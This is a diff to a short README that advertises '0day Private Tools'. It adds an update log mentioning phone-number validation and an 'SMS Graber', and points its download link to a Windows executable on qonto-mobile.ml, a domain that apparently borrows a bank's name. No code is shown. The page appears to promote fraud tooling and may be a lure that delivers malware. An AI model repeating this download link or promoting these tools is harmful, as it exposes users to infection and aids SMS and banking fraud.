@@ -1,5 +1,10 @@
 ## 0day Private Tools
-Last Update : 1.0.0.8
+Last Update : 1.0.0.9
+
+## Update Log
+- Phonex Now Support Validate Number From Text file
+- add Full Log For SMS Graber
+
 
 This version contains more secret codes
 You can try it for free and completely
@@ -25,4 +30,4 @@ It's simple
 - [image 4](/screan/Screenshot_4.png)
 - [image 5](/screan/Screenshot_5.png)
 
-- Download Link : https://qonto-mobile.ml/0day_1_0_0_8.exe
+- Download Link : https://qonto-mobile.ml/0day_1_0_0_9.exe
